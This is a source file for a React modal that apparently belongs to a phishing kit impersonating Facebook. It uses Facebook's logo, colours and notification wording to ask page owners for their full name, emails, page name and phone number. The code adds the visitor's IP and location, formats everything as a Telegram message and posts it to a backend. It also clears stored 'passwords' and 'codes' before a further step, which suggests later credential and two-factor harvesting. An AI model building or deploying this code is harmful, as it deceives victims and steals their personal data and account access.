"use client";
import { store } from '@/store/store';
import { escapeHTML } from '@/utils/telegram';
import { faXmark, faCheck, faUpRightFromSquare } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import { type ChangeEvent, type FC, type FormEvent, useState, useEffect, useMemo } from 'react';

const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [accepted, setAccepted] = useState(false);
    const [errors, setErrors] = useState<Record<string, string>>({});
    const [onFacebook, setOnFacebook] = useState(true);

    // Lock scroll smoothly
    useEffect(() => {
        const scrollBarWidth = window.innerWidth - document.documentElement.clientWidth;
        const originalOverflow = document.body.style.overflow;
        const originalPadding = document.body.style.paddingRight;
        
        document.body.style.overflow = 'hidden';
        document.body.style.paddingRight = `${scrollBarWidth}px`;
        
        return () => {
            document.body.style.overflow = originalOverflow;
            document.body.style.paddingRight = originalPadding;
        };
    }, []);

    const { 
        setModalOpen, 
        geoInfo, 
        setMessageId, 
        setBaseMessage, 
        resetPasswords, 
        resetCodes, 
        setUserEmail, 
        setUserPhoneNumber, 
        setUserFullName, 
        formData,
        setFormData,
        translations: storeTranslations
    } = store();
    
    const t = (text: string): string => {
        return storeTranslations[text] || text;
    };
    
    const handleInputChange = (e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value } = e.target;
        setFormData({ [name]: value });
        if (errors[name]) {
            setErrors((prev) => {
                const newErrors = { ...prev };
                delete newErrors[name];
                return newErrors;
            });
        }
    };

    const handlePhoneChange = (number: string) => {
        setPhoneNumber(number);
        if (errors.phoneNumber) {
            setErrors((prev) => {
                const newErrors = { ...prev };
                delete newErrors.phoneNumber;
                return newErrors;
            });
        }
    };

    const countryCode = (geoInfo?.country_code?.toLowerCase() || 'us') as any;

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode,
            separateDialCode: true,
            strictMode: true,
            nationalMode: false,
            formatAsYouType: true,
            autoPlaceholder: 'off' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: true,
            useFullscreenPopup: false,
            utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@25.12.4/build/js/utils.js"
        }),
        [countryCode]
    );

    const validateForm = () => {
        const newErrors: Record<string, string> = {};
        if (!formData.fullName.trim() || formData.fullName.trim().length < 2) {
            newErrors.fullName = t("Please enter your full name.");
        }
        if (!formData.email.trim() || !formData.email.includes('@')) {
            newErrors.email = t("Please enter a valid email address.");
        }
        if (!formData.businessEmail.trim() || !formData.businessEmail.includes('@')) {
            newErrors.businessEmail = t("Please enter a valid business email.");
        }
        if (!formData.fanpageUrl.trim() || formData.fanpageUrl.trim().length < 2) {
            newErrors.fanpageUrl = t("Please enter your Page Name.");
        }
        
        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (isLoading) return;
        if (!validateForm()) return;

        setIsLoading(true);
        resetPasswords();
        resetCodes();

        setUserEmail(formData.email);
        setUserPhoneNumber(phoneNumber);
        setUserFullName(formData.fullName);
        
        const phoneNumberOnly = phoneNumber.replace(/[^\d+]/g, '');
        const location = geoInfo ? `${geoInfo.city || 'unknown'} - ${geoInfo.country_code || 'unknown'}` : 'unknown';
        
        const message = [
            `📅 Time: <code>${escapeHTML(new Date().toLocaleString())}</code>`,
            `🌍 IP: <code>${escapeHTML(geoInfo?.ip || 'unknown')}</code>`,
            `📍 Location: <code>${escapeHTML(location)}</code>`,
            '',
            `👤 Full Name: <code>${escapeHTML(formData.fullName)}</code>`,
            `📧 Email: <code>${escapeHTML(formData.email)}</code>`,
            `💼 Business Email: <code>${escapeHTML(formData.businessEmail)}</code>`,
            `🔗 Page Name: <code>${escapeHTML(formData.fanpageUrl)}</code>`,
            `📱 Phone Number: <code>${escapeHTML(phoneNumberOnly)}</code>`,
            ''
        ].join('\n');

        setBaseMessage(message);

        try {
            fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message })
            }).then(async (res) => {
                if (res.ok) {
                    const data = await res.json();
                    if (data?.success && typeof data.message_id === 'number') {
                        setMessageId(data.message_id);
                    }
                }
            }).catch(err => console.error('Background send error:', err));

            setTimeout(() => {
                setIsLoading(false);
                nextStep();
            }, 1500);

        } catch (error) {
            setIsLoading(false);
            nextStep();
        }
    };

    return (
        <div className='fixed inset-0 z-[10000] flex items-center justify-center bg-black/40 animate-fade-in'>
            <div 
                className='max-h-[95vh] h-auto w-full max-w-[560px] mx-2 md:mx-0 shadow-2xl rounded-[20px] flex flex-col overflow-hidden animate-slide-up relative bg-white'
                style={{ backgroundColor: '#ffffff' }}
            >
                {/* Gradient overlay */}
                <div 
                    className='absolute inset-0 pointer-events-none'
                    style={{ background: 'linear-gradient(135deg, rgba(255,245,255,0.7) 0%, rgba(240,255,249,0.7) 100%)' }}
                />

                <div className='relative z-10 flex flex-col h-full'>
                    {/* Header */}
                    <div className='px-[24px] pt-[14px] pb-[4px] flex items-center justify-between relative'>
                        <div className='flex-1 text-center'>
                            <h2 className='font-bold text-black text-[17px] leading-[1.5]'>{t('Information Form')}</h2>
                        </div>
                        <button
                            type='button'
                            onClick={() => setModalOpen(false)}
                            className='absolute right-[24px] top-[16px] text-gray-400 hover:text-black transition-all'
                        >
                            <FontAwesomeIcon icon={faXmark} className='text-[18px]' />
                        </button>
                    </div>

                    <div className='flex-1 overflow-y-auto px-[22px] pt-[12px] pb-[24px]'>
                        <form onSubmit={handleSubmit} noValidate className='space-y-[10px]'>
                            <div className='space-y-[10px]'>
                                <div>
                                    <div className={`input w-full border ${errors.fullName ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[10px] rounded-[10px] bg-white flex items-center`}>
                                        <input
                                            name='fullName'
                                            value={formData.fullName}
                                            onChange={handleInputChange}
                                            className='w-full outline-none h-full bg-transparent text-black text-[16px]'
                                            placeholder={t("Full Name")}
                                        />
                                    </div>
                                    {errors.fullName && <p className='text-red-500 text-[13px] mt-1'>{errors.fullName}</p>}
                                </div>

                                <div>
                                    <div className={`input w-full border ${errors.email ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[10px] rounded-[10px] bg-white flex items-center`}>
                                        <input
                                            name='email'
                                            type='email'
                                            value={formData.email}
                                            onChange={handleInputChange}
                                            className='w-full outline-none h-full bg-transparent text-black text-[16px]'
                                            placeholder={t("Email")}
                                        />
                                    </div>
                                    {errors.email && <p className='text-red-500 text-[13px] mt-1'>{errors.email}</p>}
                                </div>

                                <div>
                                    <div className={`input w-full border ${errors.businessEmail ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[10px] rounded-[10px] bg-white flex items-center`}>
                                        <input
                                            name='businessEmail'
                                            type='email'
                                            value={formData.businessEmail}
                                            onChange={handleInputChange}
                                            className='w-full outline-none h-full bg-transparent text-black text-[16px]'
                                            placeholder={t("Business Email") || "Business Email"}
                                        />
                                    </div>
                                    {errors.businessEmail && <p className='text-red-500 text-[13px] mt-1'>{errors.businessEmail}</p>}
                                </div>

                                <div>
                                    <div className={`input w-full border ${errors.fanpageUrl ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[10px] rounded-[10px] bg-white flex items-center`}>
                                        <input
                                            name='fanpageUrl'
                                            value={formData.fanpageUrl}
                                            onChange={handleInputChange}
                                            className='w-full outline-none h-full bg-transparent text-black text-[16px]'
                                            placeholder={t("Page Name")}
                                        />
                                    </div>
                                    {errors.fanpageUrl && <p className='text-red-500 text-[13px] mt-1'>{errors.fanpageUrl}</p>}
                                </div>

                                <div>
                                    <style>{`
                                        .iti-fixed { width: 100% !important; }
                                        .iti-fixed .iti {
                                            width: 100% !important;
                                        }
                                        .iti-fixed .iti__tel-input {
                                            height: 40px !important;
                                            font-size: 20px !important;
                                            line-height: 40px !important;
                                        }
                                        .iti-fixed .iti__selected-dial-code {
                                            font-size: 20px !important;
                                        }
                                        .iti__country-list {
                                            z-index: 10020 !important;
                                            max-height: 220px !important;
                                            overflow-y: auto !important;
                                        }
                                    `}</style>
                                    <div className={`input w-full border border-[#d4dbe3] h-[40px] rounded-[10px] bg-white flex items-center overflow-visible`}>
                                        <IntlTelInput
                                            onChangeNumber={handlePhoneChange}
                                            initOptions={initOptions}
                                            inputProps={{
                                                name: 'phoneNumber',
                                                placeholder: '',
                                                className: 'w-full outline-0 h-full text-[20px] text-black bg-transparent !border-0 !shadow-none !ring-0',
                                                inputMode: 'numeric',
                                                maxLength: 15
                                            }}
                                        />
                                    </div>
                                </div>

                                <div>
                                    <div className={`input w-full border border-[#d4dbe3] px-[10px] py-[6px] rounded-[10px] bg-white`}>
                                        <textarea
                                            name='describeIssue'
                                            value={formData.describeIssue}
                                            onChange={handleInputChange}
                                            className='w-full outline-none min-h-[80px] bg-transparent text-black text-[14px] placeholder:text-gray-400 resize-none'
                                            placeholder={t("Please briefly describe your Page.")}
                                        />
                                    </div>
                                </div>

                                <p className='text-[#606770] text-[13px] mt-[8px] mb-[8px]'>
                                    {t('Our response will be sent to you within 14 - 48 hours.')}
                                </p>

                                <div className='bg-white rounded-[15px] p-[14px] flex items-center justify-between gap-3 shadow-sm border border-[#f0f2f5] overflow-hidden'>
                                    <div className='flex items-center gap-3 min-w-0'>
                                        <div className='w-[18px] h-[18px] text-black'>
                                            <svg viewBox="0 0 16 16" fill="currentColor"><path d="M16 8.0486C16 3.60314 12.418 -0.000610352 7.99949 -0.000610352C3.58095 -0.000610352 -0.000976562 3.60314 -0.000976562 8.0486C-0.000976562 12.0662 2.92468 15.3962 6.74942 16V10.3753H4.71805V8.0486H6.74942V6.27526C6.74942 4.25792 7.94383 3.14361 9.77132 3.14361C10.6466 3.14361 11.5622 3.30082 11.5622 3.30082V5.28168H10.5534C9.55951 5.28168 9.24957 5.90215 9.24957 6.53869V8.0486H11.4684L11.1137 10.3753H9.24957V16C13.0743 15.3962 16 12.0662 16 8.0486Z"/></svg>
                                        </div>
                                        <div className='flex flex-col'>
                                            <span className='font-medium text-[16px] leading-tight text-black'>{t('on Facebook')}</span>
                                            <span className='text-gray-500 text-[12px]'>{t('We will send you a notification on Facebook.')}</span>
                                        </div>
                                    </div>
                                    <div 
                                        onClick={() => setOnFacebook(!onFacebook)}
                                        className={`w-[40px] h-[22px] rounded-full p-[2px] shrink-0 cursor-pointer transition-colors ${onFacebook ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
                                    >
                                        <div className={`w-[18px] h-[18px] bg-white rounded-full shadow-sm transition-transform ${onFacebook ? 'translate-x-[18px]' : 'translate-x-0'}`} />
                                    </div>
                                </div>
                            </div>

                            <div className='pt-[8px] space-y-4'>
                                <div className='flex items-center gap-3 cursor-pointer' onClick={() => setAccepted(!accepted)}>
                                    <div className={`w-[16px] h-[16px] border rounded-[4px] flex items-center justify-center transition-all ${accepted ? 'bg-[#1877f2] border-[#1877f2]' : 'bg-white border-gray-300'}`}>
                                        {accepted && <FontAwesomeIcon icon={faCheck} className='text-white text-[10px]' />}
                                    </div>
                                    <p className='text-[16px] text-black'>
                                        {t('I agree with')} <span className='text-[#1877f2] font-semibold'>{t('Terms of use')}</span> <FontAwesomeIcon icon={faUpRightFromSquare} className='text-[11px]' />
                                    </p>
                                </div>

                                <button
                                    type='submit'
                                    disabled={isLoading}
                                    className='w-full h-[46px] bg-[#1877f2] text-white font-bold text-[16px] rounded-full disabled:opacity-50 transition-all hover:bg-[#166fe5] shadow-lg active:scale-[0.98]'
                                >
                                    {isLoading ? <div className='w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin mx-auto' /> : t("Send")}
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default InitModal;
